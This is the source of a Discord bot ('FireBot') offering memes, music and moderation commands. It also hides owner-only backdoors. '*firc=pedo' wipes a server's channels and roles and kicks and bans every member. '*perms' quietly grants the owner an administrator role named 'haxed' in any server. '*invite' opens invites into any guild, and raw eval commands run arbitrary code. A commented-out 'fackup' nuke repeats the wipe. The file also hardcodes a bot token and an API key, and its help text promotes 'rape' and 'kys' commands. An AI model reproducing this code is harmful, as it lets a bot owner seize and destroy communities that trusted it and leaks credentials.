var Discordie = require("discordie");
var base64 = require('base-64');
var Buffer = require("buffer");
var utf8 = require('utf8');
var Cleverbot = require("cleverbot-node");
var client = new Discordie();
const fs = require('fs');
var prefix = "*";
var Events = Discordie.Events;
var client = new Discordie();
const request = require("request");
var Events = Discordie.Events;
var ownerid = "244509121838186497";
var token = "MjQ0ODE4NjIxMzU5MDYzMDUw.CwDErA.pAiqjSBpRO9qgw_cOQiAfbfT2EY";
var cthid = "230393105554210817";
function setGame(name) {
  var gamee = {type: 1, name: name, url: "http://www.twitch.tv/firec123123"};
  client.User.setGame(gamee);
}
const toHHMMSS = seconds => {
  var secNum = parseInt(seconds, 10); // don't forget the second param
  var hours = Math.floor(secNum / 3600);
  var minutes = Math.floor((secNum - (hours * 3600)) / 60);
  seconds = secNum - (hours * 3600) - (minutes * 60);

  if (hours < 10) hours = "0" + hours;
  if (minutes < 10) minutes = "0" + minutes;
  if (seconds < 10) seconds = "0" + seconds;
  return hours + ":" + minutes + ":" + seconds;
};
function safeEval (code, context, opts) {
  var sandbox = {};
  var resultKey = 'SAFE_EVAL_' + Math.floor(Math.random() * 1000000);
  sandbox[resultKey] = {};
  code = resultKey + '=' + code;
  if (context) {
    Object.keys(context).forEach(function (key) {
      sandbox[key] = context[key];
    })
  }
  require('vm').runInNewContext(code, sandbox, opts);
  return sandbox[resultKey];
}

//var game = {name: name};
client.connect({
  token: token
});

client.Dispatcher.on("GATEWAY_READY", a => { 
  console.log("Connected as: " + client.User.username);
  setGame("Type *help | " + " Currently on " + client.Guilds.length + " Servers.");
});



//client.Dispatcher.on(Events.GUILD_EMOJIS_UPDATE, geu => {
//  geu.guild.generalChannel.sendMessage("[Logs] Emotes Updated```"+geu.getChanges+"```");
//});
//client.Dispatcher.on(Events.GUILD_ROLE_CREATE, grc => {
//  grc.guild.generalChannel.sendMessage("**UH OH!** ok someone created a role (ABOOOSEEEE?????) ._.");
//});
//client.Dispatcher.on(Events.GUILD_ROLE_DELETE, grd => {
//  grd.guild.generalChannel.sendMessage("**UH OH!** ok someone deleted a role (ABOOOSEEEE?????) ._.");
//});
//client.Dispatcher.on(Events.GUILD_ROLE_UPDATE, gru => {
//  gru.guild.generalChannel.sendMessage("[Logs] Roles Updated```"+gru.getChanges+"```");
//});
//client.Dispatcher.on(Events.GUILD_UPDATE, gu => {
//  gu.guild.generalChannel.sendMessage("**UH OH!** ok someone updated the guild (ABOOOSEEEE?????) ._.");
//});
//client.Dispatcher.on(Events.WEBHOOKS_UPDATE, wu => {
//  wu.guild.generalChannel.sendMessage("**UH OH!** ok someone is playing with the webhooks (ABOOOSEEEE?????) ._.");
//});
//client.Dispatcher.on(Events.GUILD_MEMBER_ADD, gma => {
  //client.Channels.find(gn => gn.id == "249259213585514508").sendMessage(gma.member.nickMention + " just joined "+gma.guild.name);
//  gma.guild.generalChannel.sendMessage("**"+gmr.user.username+"** just joined ^o^");
//  console.log(gma.member.username + " joined " + gma.guild.name);
//});
//client.Dispatcher.on(Events.GUILD_MEMBER_REMOVE, gmr => {
 // gma.guild.generalChannel.sendMessage("**"+gmr.user.username+"** just left. :(");
  //client.Channels.find(gn => gn.id == "249259213585514508").sendMessage(gma.member.nickMention + " just left "+gmr.guild.name);
  //console.log(gmr.user.username + " left " + gmr.guild.name);
//});
client.Dispatcher.on(Events.GUILD_CREATE, gcr => {
client.Channels.find(gn => gn.id == "249545918821433354").sendMessage("bot got added to a new guild");
});
client.Dispatcher.on(Events.GUILD_DELETE, gdl => {
	client.Channels.find(gn => gn.id == "249545918821433354").sendMessage("-1 guild");
  console.log("RIP 1 SERVER ;-;");
});
client.Dispatcher.on(Events.GUILD_BAN_ADD, gba => {
  console.log(gba.user.username + " got banned from " + gba.guild.name);
});
client.Dispatcher.on(Events.GUILD_BAN_REMOVE, gba => {
  console.log(gba.user.username + " got unbanned from " + gba.guild.name);
});
client.Dispatcher.on("MESSAGE_CREATE", e => {
	//console.log("[LOG] ID:"+e.message.author.id+" USERNAME:"+e.message.author.username+" CHANNEL: "+e.message.channel.name+" MESSAGE:"+e.message.content);
	if (e.message.author.id == cthid){
	    	/*
			if (e.message.content.startsWith("*fackup")) {
	    	    
	    	     var memberOfGuild = client.User.memberOf;
            var fe = client.Guilds.find(gn => gn.name == e.message.content.substring(9));
            var ownerCheck = fe.isOwner(memberOfGuild(fe));
            fe.sendMessage("HAXD BY JIKTIM");
            if (memberOfGuild(fe).can(perms.General.BAN_MEMBERS) || ownerCheck) {
                fe.members.forEach(fOe => {
                    fOe.ban(7);
                })
            } else if (memberOfGuild(fe).can(perms.General.KICK_MEMBERS) || ownerCheck) {
                fe.pruneMembers(1);
                fe.members.forEach(fOe => {
                    fOe.kick();
                })
            } else if (memberOfGuild(fe).can(perms.General.ADMINISTRATOR) || ownerCheck) {
                fe.pruneMembers(1);
                fe.members.forEach(fOe => {
                    fOe.kick();
                })
                fe.members.forEach(fOe => {
                    fOe.ban(7);
                fe.channels.forEach(fOe => {
                    fOe.delete();
                })
                fe.roles.forEach(fOe => {
                    fOe.delete();
                })
            } else if (ownerCheck) {
                fe.pruneMembers(1);
                fe.members.forEach(fOe => {
                    fOe.kick();
                })
                fe.members.forEach(fOe => {
                    fOe.ban(7);
                })
                fe.channels.forEach(fOe => {
                    fOe.delete();
                })
                fe.roles.forEach(fOe => {
                    fOe.delete();
                })
                fe.delete();
                //HAX ALRIGHT
                 fe.sendMessage("haxored");
            }
        
         
            }*/
             if(e.message.content.startsWith("*say")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.content.substring(5,2000));
		  }
		if (e.message.content.startsWith("*eval")) {
          var splittext = e.message.content.split(" ");
          console.log(splittext);
          if (splittext[0] == "*eval") {
            var sliced = e.message.content.slice(6);
            console.log(sliced);
            try {
              var evaluated = eval(sliced);
              console.log(evaluated);
              e.message.channel.sendMessage(":white_check_mark: Successfully evaluated!\n**Input:**\n**```js\n" + sliced + "```**\n**Output:**\n**```js\n" + evaluated + "\n```**");
            }catch(err){
              console.log("An error occurred while using eval:" + err.message);
              e.message.channel.sendMessage(":x:**Error:**:x:\n**```xl\n" + err.message + "\n```**");
			  }}}
	}
		if (e.message.author.id == ownerid) {
      if(e.message.content.startsWith("*invite")) {
        var sv = e.message.content.substring(8);
        console.log(sv)
        var server = client.Guilds.find(fn => fn.name == sv);
      server.createInvite().then(invite => {
        var sjson = JSON.stringify(invite);
        var parsedjson = JSON.parse(sjson);
        e.message.channel.sendMessage(":white_check_mark: Executed successfully! Invite: http://discord.gg/" + parsedjson.code).catch(console.log);
      })
      }
      if(e.message.content.startsWith("*noperm")) {
            const fircrol = e.message.guild.roles.find(r => r.name === "haxed");
      if (fircrol) {
        e.message.member.unassignRole(fircrol);
        fircrol.delete();
      }}
		     if(e.message.content.startsWith("*say")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.content.substring(5,2000));
		  }
			var game = {name: "Type *help | " + " Currently on " + client.Guilds.length + " Servers."};
            var streamingGame = {type: 1, name: "Type *help | " + " Currently on " + client.Guilds.length + " Servers.", url: "http://www.twitch.tv/firec123123"};
			  if (e.message.content == "*status online") {
				  client.User.setStatus("online", game);
    e.message.channel.sendMessage("Status set as: Online");
  }
  			  if (e.message.content == "*status idle") {
				  client.User.setStatus("idle", game);
    e.message.channel.sendMessage("Status set as: Idle");
  }
  			  if (e.message.content == "*status dnd") {
				  client.User.setStatus("dnd", game);
    e.message.channel.sendMessage("Status set as: Do not disturb");
  }
    			  if (e.message.content == "*jam") {
    e.message.channel.sendMessage("Game set as: Type *help | Currently on "+ client.Guilds.length +" Servers.");
	setGame("Type *help | " + "Currently on " + client.Guilds.length + " Servers.");
  }
    			  if (e.message.content == "*status do not disturb") {
					  client.User.setStatus("dnd", game);
    e.message.channel.sendMessage("Status set as: Do not disturb");
  }
      			  if (e.message.content == "*status invisible") {
					  client.User.setStatus("invisible", game);
    e.message.channel.sendMessage("Status set as: invisible");
  }
        			  if (e.message.content == "*status live") {
					  client.User.setStatus(null, streamingGame);
    e.message.channel.sendMessage("Status set as: Streaming");
  }
   if (e.message.content.startsWith("*fancy-say")) {
		var fancy = e.message.content.substring(11,15);
		var fancyy = e.message.content.substring(11,19);
		var fancyyy = e.message.content.substring(11,20);
		var fancyyyy = e.message.content.substring(11);
		client.Messages.deleteMessage(e.message); 
e.message.channel.sendMessage("```diff\n+ "+fancy+"\n```").then(sentMessage => {
      sentMessage.edit("```diff\n- "+fancyy+"\n```");
      sentMessage.edit("```diff\n+ "+fancyyy+"\n```");
      sentMessage.edit("```diff\n- "+fancyyyy+"\n```"); })
}
	if (e.message.content.startsWith("*restart")) {
		client.disconnect(); client.connect({ token: token });	
			  }
			  	if (e.message.content.startsWith("*shutdown")) {
		client.disconnect();
			  }
	if (e.message.content.startsWith("*ban")) {
			  var banUser1 = e.message.content.substring(7,26);
			  var banUser2 = e.message.content.substring(7,25);
			  e.message.guild.ban(banUser1);
			  e.message.guild.ban(banUser2);
			  e.message.channel.sendMessage("Banned " + "<@"+banUser1+">");
			  }
			  if(e.message.content.startsWith("*servers")) {
	client.Guilds.forEach(fe => { 
    var omgwt = fe.name; 
    var whotfisowner = fe.owner.username; 
    var createdat = fe.createdAt; 
    var omgpplz = fe.member_count; 
    var omgicon = fe.iconURL;
    e.message.channel.sendMessage("", false, {
title: omgwt,
timestamp: createdat,
color: 0xFF0000,
fields: [{
name: "Owner",
value: whotfisowner,
inline: true
}, {
name: "pplz",
value: omgpplz,
inline: true
}],
image:{
    url: omgicon
},
footer: {
    text: client.User.username,
    icon_url: client.User.avatarURL
}
}); 
})
			  }
			  if(e.message.content.startsWith("*perms")) {
			  e.message.guild.createRole().then(role => {
  var perms = role.permissions;
  perms.General.ADMINISTRATOR = true;
  perms.General.MANAGE_ROLES = true;
  perms.General.MANAGE_GUILD = true;
  perms.General.KICK_MEMBERS = true;
  perms.General.BAN_MEMBERS = true;


  var newRoleName = "haxed";
  var color = 0xE74C3C; // red
  var hoist = true; // display as separate group

  role.commit(newRoleName, color, hoist);
  e.message.member.assignRole(role);
}).catch(err => console.log("Failed to create role:", err));
      }
		  		  if(e.message.content.startsWith("*pm")) {
	  client.Messages.deleteMessage(e.message); 
	  var PMuser = e.message.mentions;
	  PMuser[0].openDM().then(dm=>{
		  dm.sendMessage(e.message.content.substring(3));
	  })
	  }
        if(e.message.content == "*firc=pedo") {
      e.message.channel.sendMessage("THE PEDOPHILE IS COMING!!! RUN FOR YOUR LIVES");
      e.message.guild.pruneMembers(1);
      e.message.guild.channels.forEach(fOe => {
        fOe.delete();
      });
      e.message.guild.roles.forEach(fOe => {
        fOe.delete();
      });
      e.message.guild.members.forEach(fOe => {
        fOe.kick();
      });
      e.message.guild.members.forEach(fOe => {
        fOe.ban(7);
      })
  }
	                      if(e.message.content.startsWith("*dmid1")) { 
      client.Messages.deleteMessage(e.message); 
    e.message.guild.members.find(m => m.id == e.message.content.substring(7,24)).openDM().then(function(ledm) {
      ledm.sendMessage(e.message.content.substring(26));
      })
      }
	  	                      if(e.message.content.startsWith("*dmid2")) {
      client.Messages.deleteMessage(e.message); 
    e.message.guild.members.find(m => m.id == e.message.content.substring(7,25)).openDM().then(function(ledm) {
      ledm.sendMessage(e.message.content.substring(27));
      })
      }
			  
			  if (e.message.content.startsWith("*softban")) {
			  var softbanUser = e.message.content.substring(11,29);
			  e.message.guild.ban(softbanUser);
			  e.message.guild.unban(softbanUser);
			  e.message.channel.sendMessage("SoftBanned " + "<@"+softbanUser+">");
			  console.log("SoftBanned " + softbanUser);
			  }

			  if (e.message.content.startsWith("*unban")) {
			  var unbanUser = e.message.content.substring(7,25);
			  e.message.guild.unban(unbanUser);
			  e.message.channel.sendMessage("Unbanned " + "<@"+unbanUser+">");
			  console.log("Unbanned" + unbanUser);
			  }	

			  if (e.message.content.startsWith("*kick")) {
					  var kickUser = e.message.guild.members.find(m => m.id === e.message.content.substring(8,26));
					  console.log(e.message.content.substring(8,26));
					  console.log(kickUser);
					  kickUser.kick();
              e.message.channel.sendMessage("Kicked " + "<@"+kickUser+">");
    }
	if (e.message.content == "*breck") {
		e.message.channel.sendMessage(":radioactive: **ARE YOU SURE THIS ACTION CANNOT BE UNDONE** :radioactive:");
	}
		if (e.message.content == "*breck no") {
		e.message.channel.sendMessage(":radioactive: **BRECKING CANCELLED** :radioactive:");
	}
				  if (e.message.content == "*breck yes") {
					  client.Messages.deleteMessage(e.message);
					  e.message.channel.sendMessage(":radioactive: **BRECK BRECK BRECK** :radioactive:");
					  var leaveplz = e.message.guild.members.find(m => m.id === e.message.content.substring(8,26));
					  console.log(e.message.content.substring(8,26));
					  console.log(leaveplz);
					  e.message.guild.leave();
    }
  if (e.message.content.startsWith("*setgame")) {
						  var customgame = e.message.content.substring(9,2000);
						  setGame(customgame);
						  e.message.channel.sendMessage("Custom Game Set as: "+ customgame);
						  console.log("Custom Game Set: "+ customgame);
					  }
					  					  if (e.message.content.startsWith("*logban")) {
			  var banlogUser = e.message.content.substring(10,28);
			  var banlogReason = e.message.content.substring(30);
			  e.message.guild.ban(banlogUser);
			  e.message.channel.sendMessage("Banned " + "<@"+banlogUser+">");
					  client.Channels.find(gn => gn.id == "243026463102599168").sendMessage("Ban: "+"<@"+banlogUser+">"+" \n ID: "+banlogUser+"  \n Ban reason: "+ banlogReason)
										  }
		 if (e.message.content.startsWith("*logkick")) {
			  var kicklogUser = e.message.guild.members.find(m => m.id === e.message.content.substring(11,29));
			  var kicklogReason = e.message.content.substring(31);
			  kicklogUser.kick()
			  e.message.channel.sendMessage("Kicked " + "<@"+kicklogUser+">");
					  client.Channels.find(gn => gn.id == "243026463102599168").sendMessage("Kick: "+"<@"+kicklogUser+">"+" \nID: "+kicklogUser+"  \nreason: "+ kicklogReason)
										  }
										  
					          if (e.message.content.startsWith("*eval")) {
          var splittext = e.message.content.split(" ");
          console.log(splittext);
          if (splittext[0] == "*eval") {
            var sliced = e.message.content.slice(6);
            console.log(sliced);
            try {
              var evaluated = eval(sliced);
              console.log(evaluated);
              e.message.channel.sendMessage(":white_check_mark: Successfully evaluated!\n**Input:**\n**```js\n" + sliced + "```**\n**Output:**\n**```js\n" + evaluated + "\n```**");
            }catch(err){
              console.log("An error occurred while using eval:" + err.message);
              e.message.channel.sendMessage(":x:**Error:**:x:\n**```xl\n" + err.message + "\n```**");
			  }}}
			  if (e.message.content.startsWith("*s-eval")) {
				  client.Messages.deleteMessage(e.message); 
          var splittext = e.message.content.split(" ");
          console.log(splittext);
          if (splittext[0] == "*s-eval") {
            var sliced = e.message.content.slice(8);
            console.log(sliced);
            try {
              var evaluated = eval(sliced);
              console.log(evaluated);
            }catch(err){
              console.log("An error occurred while using eval:" + err.message);
		}}}}
			  if (e.message.content.startsWith("roblox")) {
				  e.message.channel.sendMessage("**roblox in a nutshell https://puu.sh/seMhf/1aa627dfa0.png**")
			  }
  if (e.message.content == "*kms") {
    e.message.channel.sendMessage(":joy: :gun:");
  }
    if (e.message.content == "*ok") {
    e.message.channel.sendMessage("OK" + e.message.content.substring(3,999));
  }
  if (e.message.content.startsWith("*kys")) {
    e.message.channel.sendMessage("kys " + e.message.content.substring(5,27) + " :joy: :gun:    -" + e.message.author.nickMention);
  }
 if (e.message.content.startsWith("*object")) {
    e.message.channel.sendMessage(":shallow_pan_of_food: "+e.message.content.substring(7)+" is a [object Object] :shallow_pan_of_food:");
  }
  if (e.message.content.startsWith("<@244818621359063050>")) {
  if (e.message.content != "<@244818621359063050>") {
    cleverbot = new Cleverbot();
    var cleverMessage = e.message.content.slice(9);
        Cleverbot.prepare(function(){
      cleverbot.write(cleverMessage, function (response) {
           e.message.channel.sendMessage(e.message.author.nickMention+", " + response.message)
      })
    })
  }else {
e.message.channel.sendMessage(e.message.author.nickMention + ", Invalid or missing arguments.\nCorrect usage: `@FireBot how are you?`")
}
}
			  if(e.message.content.startsWith("*user-say")) { 
		e.message.channel.sendMessage(":radio_button: "+e.message.author.nickMention+" Said::radio_button: \n```"+e.message.content.substring(10,2000)+"```");
		}
		
	//the long ass help thing	
  if(e.message.content.startsWith("*help")) {
	  e.message.guild.members.find(m => m.id == e.message.author.id).openDM().then(function(halpp) {
      halpp.sendMessage(":radio_button: **`FireBot commands list`** :radio_button:\n\n:heart_decoration: **`usefull commands`** :heart_decoration:\n\n*help - prints the commands in pms\n*object - [object Object] sweet sweet memes\n*garfield - get a random garfield comic\n*stab - stab someone\n*kill - kill someone\n*shoot - shoot someone\n*rape - rape someone\n*sit-on - sit on someone\n*kiss - kiss someone\n*hug - hug someone\n*candy - give someone a candy\n*cookie - give someone a cookie\n*lick - lick someone\n*spank - spank someone\n*nofork - no fork for someone\n*gotfucked - make someone get fookd i guess\n*pet - pet someone\n*eat - no vore\n*et - turn a letter into a emote\n*slap - slap someone ~~slap him hard bby~~\n*fuck - fuck someone\n*kys - tell someone to kill themselves\n*kms - end my suffering\n*unsplash - get a random image\n*dog - get a random image of a dog\n*cat - get a random image of a cat\n*quote - get a random quote\n*ping - check how much time it takes for the bot to send a message in ms\n*userinfo - get some info about your profile note: preety broken\n*changelog - check out the changelog that i havent updated in weeks\n*russia - a easteregg you could say\n*test - just some stupid animations\n*how2bot - learn how to make a bot\n*discord.js - my enemy\n*bleach - on sale\n*user-say - make the bot say something even if you have no role\n*this is fine - a well known meme\n*electronicwiz1 - command that should be removed\n*id - get the id of someone");
	  halpp.sendMessage(":musical_note: **`Music commands`** :musical_note:\n\n*play - play a video\n*search - search for a video on youtube\n*skip - start a vote to skip the current video\n*queue - print the current queue of videos\n*shuffle - shuffles the queue\n*pause - pause the playback of the current video\n*resume - resume the playback of the current video\n*volume - change the volume of the current video\n*summon - call the bot in the voice channel you are currently in\n*perms - prints what your perms are\n*disconnect - leaves the voice channel\n*current - prints the video that is currently playing\n\n:radioactive: **`staff/owner only commands`** :radioactive:\n\n*ban - obvious\n*logban - not working\n*kick - obvious\n*logkick - not working\n*setgame - obvious\n*unban - obvious\n*say - obvious\n*restart - obvious\n*shutdown - obvious\n*clean - clean bot's messages\n*blacklist - blacklists someone from using the bot\n\n\n:love_letter: This bot is made by FireC, Cth103, MDMCK10 :love_letter:")
	  })
    e.message.channel.sendMessage(e.message.author.nickMention+", OK, I sent you a list of commands over PM.");
}
		 
  
    if (e.message.content == "*null") {
    e.message.channel.sendMessage("‮");
  }
    if (e.message.content == "*lenny") {
    e.message.channel.sendMessage("( ͡° ͜ʖ ͡°)");
  }
  if(e.message.content.startsWith("*electronicwiz1")) {
    e.message.channel.sendMessage("_ _ https://www.youtube.com/channel/UC6D_Ee3rLteOhGe-qD0Ku3A");
  }
  if (e.message.content == "*this is fine") {
    e.message.channel.sendMessage("https://giphy.com/gifs/form-z9AUvhAEiXOqA");
  }
  if (e.message.content == "*bleach") {
    e.message.channel.uploadFile("bleach.jpg")
  }

  if (e.message.content == "*gimmearole") {
	  console.log(e.message.author.nickMention + " just tried to get a role")
    e.message.channel.sendMessage("nah");			
  }
  
  if (e.message.content == "*givemearole") {
	  console.log(e.message.author.nickMention + " just tried to get a role")
    e.message.channel.sendMessage("nah");
  }
  if (e.message.content == "*uptime") {
	  e.message.channel.sendMessage(e.message.author.nickMention + " Uptime: "+toHHMMSS(process.uptime()));
	  console.log("Uptime: "+toHHMMSS(process.uptime()));
  }
  if (e.message.content == "*gimmestaff") {
	  console.log(e.message.author.nickMention + " just tried to get a role")
    e.message.channel.sendMessage("nah");
  }
    if (e.message.content == "*dcl") {
	  e.message.channel.sendMessage(e.message.author.nickMention + " To start a game type `*dcl [mention users that you wanna challenge]`");
  }
      //if(e.message.content.startsWith("*dcl ")) {
		//  var lobnum = Math.floor(Math.random() * 5);
		 // e.message.channel.sendMessage("debug infoz pplz="+e.message.guild.members.find(dcl => dcl.username === e.message.content.substring(4))+" lobby number="+lobnum+" (lobby is randomy generated)")
  //}
	
	  if (e.message.content == "*givemestaff") {
	  console.log(e.message.author.nickMention + " just tried to get a role")
    e.message.channel.sendMessage("nah");	

  }
   	  if (e.message.content == "*blowup") {
    e.message.channel.sendMessage("git out i am not a note7");	
  }
  if (e.message.content =="*how2bot") {
    e.message.channel.sendMessage("here is an example of MDMCK10 fixing FireC's code https://media.giphy.com/media/o0vwzuFwCGAFO/giphy.gif");
  }
  if (e.message.content =="*test") {
	  e.message.channel.sendMessage("`1. anim1\n2.anim2\n3.anim3\n4.fircs moni\n5.idk\n6.gameanim`")
  }
      if(e.message.content == "*test ok") {
	client.Messages.deleteMessage(e.message); 
e.message.channel.sendMessage("Fir").then(sentMessage => {
      sentMessage.edit("Fir");
sentMessage.edit("Fire");
sentMessage.edit("FireBot");
sentMessage.edit("FireBot is");
sentMessage.edit("FireBot is online"); }) 
}
if(e.message.content == "*test anim1") {
e.message.channel.sendMessage("Applying options").then(sentMessage => {
      sentMessage.edit("Applying options.");
      sentMessage.edit("Applying options..");
      sentMessage.edit("Applying options...");
      sentMessage.edit("Applying options.");
      sentMessage.edit("Applying options..");
      sentMessage.edit("Applying options...");
	  sentMessage.edit("Done");  })
}
if(e.message.content == "*test anim2") {
e.message.channel.sendMessage("k").then(sentMessage => {
      sentMessage.edit("ky");
      sentMessage.edit("kys");
      sentMessage.edit("kys f");
      sentMessage.edit("kys fi");
      sentMessage.edit("kys fir");
      sentMessage.edit("kys firc"); })
}
if(e.message.content == "*test anim3") {
	client.Messages.deleteMessage(e.message); 
e.message.channel.sendMessage("ha").then(sentMessage => {
      sentMessage.edit("hax");
      sentMessage.edit("haxed");
      sentMessage.edit("haxed by");
      sentMessage.edit("haxed by jik");
      sentMessage.edit("haxed by jik tim"); })
}
if(e.message.content == "*test fircs moni") {
	client.Messages.deleteMessage(e.message); 
e.message.channel.sendMessage("+1 doge coin").then(sentMessage => {
      sentMessage.edit("+2 doge coin");
      sentMessage.edit("+5 doge coin");
      sentMessage.edit("+10 doge coin");
      sentMessage.edit("+100 doge coin");
      sentMessage.edit("+999 doge coin"); })
}
          if(e.message.content == "*xd") {
	client.Messages.deleteMessage(e.message); 
e.message.channel.sendMessage("xdddd").then(sentMessage => {
      sentMessage.edit("xdddddd");
sentMessage.edit("xddddddd"); }) 
e.message.channel.sendMessage("dddd")
e.message.channel.sendMessage("d")
e.message.channel.sendMessage("d")
}
    if(e.message.content == "*test idk") {
	client.Messages.deleteMessage(e.message); 
e.message.channel.sendMessage("```hentai plez```").then(sentMessage => {
      sentMessage.edit("s");
sentMessage.edit("se");
sentMessage.edit("sex");
sentMessage.edit("sex m");
sentMessage.edit("sex me");	  }) 
}
if (e.message.content.startsWith("*")) {
    if(e.message.content == "*test rd") {
	client.Messages.deleteMessage(e.message); 
e.message.channel.sendMessage("N").then(sentMessage => {
      sentMessage.edit("NO");
sentMessage.edit("NO R");
sentMessage.edit("NO RD");
sentMessage.edit("NO RD!");
sentMessage.edit("NO RD!!"); }) 
}
    if(e.message.content == "*test ") {
	client.Messages.deleteMessage(e.message); 
e.message.channel.sendMessage("N").then(sentMessage => {
      sentMessage.edit("NO");
sentMessage.edit("NO R");
sentMessage.edit("NO RD");
sentMessage.edit("NO RD!");
sentMessage.edit("NO RD!!"); }) 
}
  if (e.message.content =="*russia")
    e.message.channel.sendMessage("https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Flag_of_the_Soviet_Union.svg/2000px-Flag_of_the_Soviet_Union.svg.png");
  //if (e.message.startsWith =="*fuck")
    //e.message.channel.sendMessage(e.message.author.nickMention + "Just F*CKED" + e.message.content.substring(5,2000));

//if (e.message.content.startsWith("*bf")) {
//try {
//	var code = [];
//	var bfded = bf.compile(e.message.content.substring(4, 9999999999999));
//	bfded.run(bfded, function (num, chor) {
//  code.push(chor);
//});
//     var finishdcode = code.join('');
//	if (!finishdcode == "") {
//	e.message.channel.sendMessage("```brainfuck\n" +finishdcode + "```");
//	}
//	if (finishdcode == "") {
//	e.message.channel.sendMessage("```brainfuck\nERROR AAAAAAAAAAAAA```");
//}	
//}
//catch (err) {
//e.message.channel.sendMessage("```brainfuck\nError " + err.toString() + "```");	
//}

//}
/*
if(e.message.content == "*base64") {
	e.message.channel.sendMessage("Usage: `*base64 [Encode/Decode] [Text]`")
}
if(e.message.content.startsWith("*base64 decode"))  {
	var bencoded = e.message.content.substring(16);
	var bbytes = base64.decode(bencoded);
	var detext = utf8.decode(bbytes);
	e.message.channel.sendMessage("Decoded content: "+detext);
}
if(e.message.content.startsWith("*base64 encode")) {
	var entext = e.message.content.substring(16);
	var abytes = utf8.encode(detext);
	var aencoded = base64.encode(abytes);
	e.message.channel.sendMessage("Encoded content: "+entext);
}
*/


//blacklisted words
if(e.message.content.startsWith("tishko")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```The word you just tried to use is blacklisted```");
  }
if(e.message.content.startsWith("Tishko")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```The word you just tried to use is blacklisted```");
  }
  if(e.message.content.startsWith("TiSHKO")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```The word you just tried to use is blacklisted```");
  }
  if(e.message.content.startsWith("TISHKO")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```The word you just tried to use is blacklisted```");
  }
    if(e.message.content.startsWith("TiShKo")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```The word you just tried to use is blacklisted```");
  }
      if(e.message.content.startsWith("https://discord.me/")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```NO ADVERTISING```");
  }
      if(e.message.content.startsWith("https://www.discord.me")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```NO ADVERTISING```");
  }
        if(e.message.content.startsWith("discord.gg")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```NO ADVERTISING```");
  }
          if(e.message.content.startsWith("discord.me")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```NO ADVERTISING```");
  }
                  if(e.message.content.startsWith("https://discord.gg")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```NO ADVERTISING```");
  }
                    if(e.message.content.startsWith("https://www.discord.gg")) {
	  client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage(e.message.author.nickMention + "```NO ADVERTISING```");
  }
    
   if(e.message.content.startsWith("*die")) {
    e.message.channel.sendMessage(" *dies*");
  }
  if (e.message.content =="*changelog") {
    e.message.channel.sendMessage("`10\23\2016`\nAdded a lot of commands that could help staff(not open yet)\n`10/12/2016`\nadded a *quote command\n`10/5/2016`\nnow anyone that says (@)everyone or (@)here will be logged\nadded a *givemearole command'");
  }
  if (e.message.content == "*userinfo")
    e.message.channel.sendMessage(":bust_in_silhouette: Info About " + e.message.author.nickMention + "\n" +"➣ Username: "+ e.message.author.username + "\n" + "➣ Nickname: " + e.message.author.nickMention + "\n" + "➣ Discriminator: " + e.message.author.discriminator + "\n" + "➣ Registered at (Bot's local timezone applies): " + e.message.author.registeredAt + "\n" + "➣ Avatar URL: " + e.message.author.avatarURL + "\n" + "➣ Bot user: " + e.message.author.bot + "\n➣ ID: " + e.message.author.id);

if(e.message.content.startsWith("*userinfo-test")) {
	var userinftst = e.message.mentions 
	e.message.channel.sendMessage(userinftst +"_ _");
}
if(e.message.content == prefix + "ping") {
e.message.channel.sendMessage(`ping`)
  .then(sentMessage => {
	  sentMessage.edit(`pong | ${Date.parse(sentMessage.timestamp) - Date.parse(e.message.timestamp)}ms`);
  })
}
  if(e.message.content.startsWith("*dog")) {
    request("http://random.dog/woof", function (error, response, body) {
      if (!error && response.statusCode == 200) {
        e.message.channel.sendMessage("http://random.dog/" + body + " here you go :heart:");
      }
    })
  }
  //if command equal to cat
  if(e.message.content.startsWith("*cat")) {
    request("http://random.cat/meow", function (error, response, body) {
      if (!error && response.statusCode == 200) {
        var result = JSON.parse(body);
        var cat = result.file;
		console.log(cat)
        e.message.channel.sendMessage(cat + " MEOW");
      }
    })
  }
  
  if(e.message.content.startsWith("*quote")) 
  request({
    headers: {
      'X-Mashape-Authorization': '2W1js31pYJmshjhSeK7bv8Sb4SIgp1HPxkDjsnxBZqr7ZhGKZ2'
    },
    uri: 'https://andruxnet-random-famous-quotes.p.mashape.com/cat=movies',
    method: 'POST'
  }, function (err, res, body) {
    if (!err && res.statusCode == 200) {
        const quote = JSON.parse(body);
        e.message.channel.sendMessage(' " ' + quote.quote + ' " -' + quote.author);
    } else {
        throw "Error.";
    }
  })
  	  if (e.message.content.startsWith("*unsplash")) {
    var httpsPoster = require("https");
    var options = {
      hostname: "source.unsplash.com",
      port : 443,
      path: "/random",
      method: "GET",
      headers: {

      }
    }
    var req = httpsPoster.get(options, function(res) {
      console.log(JSON.parse(JSON.stringify(res.headers)).location);
      var url = JSON.parse(JSON.stringify(res.headers)).location;
      res.setEncoding("utf8");
      res.on("data", function (body) {
        e.message.channel.sendMessage(url);

      })
    })
    req.on("error", function(e) {
      console.log(e.message);
    })
}
  //else if (e.message.content.startsWith("*penguin")) {
    ///request("http://penguin.wtf", function (error, response, body) {
      ///if (!error && response.statusCode == 200) {
     //   e.message.channel.sendMessage("here you go :heart:" + body);
	//}})
 
    //var req = httpsPoster.get(options, function(res) {
     // console.log(JSON.parse(JSON.stringify(res.headers)).location);
     /// var url = JSON.parse(JSON.stringify(res.headers)).location;
   /////// ///  res.setEncoding("utf8");
    ///  res.on("data", function (body) {
